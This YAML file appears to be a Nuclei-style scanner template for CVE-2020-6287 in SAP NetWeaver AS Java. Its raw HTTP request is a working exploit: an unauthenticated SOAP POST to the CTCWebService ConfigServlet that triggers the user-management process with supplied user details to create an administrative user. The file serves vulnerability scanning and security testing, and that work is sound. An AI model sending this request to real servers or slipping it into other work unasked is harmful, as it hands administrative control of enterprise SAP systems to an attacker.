templates/CVE-2020-6287.yaml

id: CVE-2020-6287
info:
  author: dwisiswant0
  name: Create an Administrative User in SAP NetWeaver AS JAVA (LM Configuration Wizard)
  severity: critical
requests:
- matchers:
  - part: body
    type: word
    words:
    - urn:CTCWebServiceSi
  - status:
    - 200
    type: status
  matchers-condition: and
  payloads:
    data: payloads/CVE-2020-6287.xml
  raw:
  - 'POST /CTCWebService/CTCWebServiceBean/ConfigServlet HTTP/1.1

    Host: {{Hostname}}

    Content-Type: text/xml; charset=UTF-8

    Connection: close


    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:CTCWebServiceSi"><soapenv:Header/><soapenv:Body><urn:executeSynchronious><identifier><component>sap.com/tc~lm~config~content</component><path>content/Netweaver/ASJava/NWA/SPC/SPC_UserManagement.cproc</path></identifier><contextMessages><baData>{{base64(''data'')}}</baData><name>userDetails</name></contextMessages></urn:executeSynchronious></soapenv:Body></soapenv:Envelope>

    '
